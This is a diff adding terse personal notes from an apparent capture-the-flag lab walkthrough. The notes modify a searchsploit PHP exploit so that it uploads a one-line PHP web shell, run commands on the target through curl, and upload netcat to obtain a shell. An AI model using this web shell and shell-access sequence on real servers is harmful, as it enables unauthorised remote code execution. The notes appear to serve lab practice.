@@ -1,0 +1,17 @@
+read through all searchsploit
+
+we found a node point ==rest==
+
+exploits/php/webapps/41564.php this searchsploit said according to version
+
+changed the parameters to
+
+'filename' => '0xdf.php',
+
+'data' => '<?php system($_REQUEST["cmd"]); ?>'
+
+running the script and then curling at curl http://10.10.10.9/0xdf.php?cmd=whoami
+
+the file name should be the same as you have put
+
+thenn upload nc and then get a shell
